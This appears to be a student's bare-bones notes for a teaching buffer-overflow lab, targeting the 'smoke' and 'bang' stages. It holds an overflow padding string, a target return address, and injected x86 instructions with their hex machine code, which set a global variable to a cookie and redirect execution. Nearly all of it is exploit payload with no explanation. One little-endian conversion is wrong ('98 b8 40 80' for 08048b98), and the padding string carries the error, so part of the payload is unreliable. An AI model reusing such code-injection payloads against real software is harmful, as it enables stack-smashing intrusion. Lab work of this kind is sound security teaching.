08048b98 = smoke
little endian = 98 b8 40 80
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 b8 40 80

bang = 08048c1d
global var = 0x804d100
cookie = 0x61082302


movl $0x61082302, 0x804d100
pushl $0x08048c1d
ret

//Hex
c7 05 00 d1 04 08 02 23 08 61 68 1d 8c 04 08 c3
55683108


b8 02 23 08 61 68 3e 8d 04 08 c3
